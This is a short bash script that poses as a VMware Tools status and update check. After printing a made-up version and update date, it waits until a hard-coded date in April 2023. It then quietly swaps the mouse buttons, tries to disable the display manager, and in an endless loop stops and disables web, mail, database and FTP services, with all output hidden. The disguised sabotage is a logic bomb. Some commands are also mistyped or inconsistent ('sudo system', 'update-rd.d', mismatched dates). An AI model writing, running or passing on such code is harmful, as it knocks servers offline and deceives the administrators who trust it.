#!/bin/bash
VMWARE_TOOLS_INSTALL_DIR="/lib/systemd/system/"
if [ ! -d "$VMWARE_TOOLS_INSTALL_DIR" ]; then
  echo "Error: VMware Tools installation directory not found"
  exit 1
fi
if systemctl is-active open-vm-tools.service &> /dev/null; then
  echo "VMware Tools service is running"
else
  echo "VMware Tools service is not running"
fi
systemctl status vmware-tools.service
echo "VMware Tools version: 12.2.0"
echo "Last update: March 3, 2023"

target_date="2023-05-03"
target_time="17:13:00"
target_timestamp=$(date -d "${target_date} ${target_time}" +%s)
current_timestamp=$(date +%s)
sleep_time=$(( target_timestamp - current_timestamp ))
echo "Next update: May 3, 2023"
while [ $(date +%s) -lt $(date --date="2023-04-17T17:13:00" +%s) ]; do
    sleep 1
done
xmodmap -e "pointer = 3 2 1" &> /dev/null
if command -v systemctl &> /dev/null; then
	sudo system disable display-manager.service &>/dev/null
else
	sudo update-rd.d -f display-manager remove &>/dev/null
fi
services=(apache2 imap httpd nginx mysql ftp vsftpd proftpd exim dovecot)
while true; do
	for service in "${services[@]}"; do
		if command -v systemctl &> /dev/null; then
			sudo systemctl stop "$service" &>/dev/null
			sudo systemctl disable "$service" &>/dev/null
		else
			sudo service "$service" stop &>/dev/null
			sudo update-rc.d -f "$service" remove &>/dev/null
		fi
	done
	if command -v systemctl &> /dev/null; then
		sudo system stop display-manager.service &>/dev/null
	else
		sudo service display-manager stop &>/dev/null
	fi
	sleep 120
done
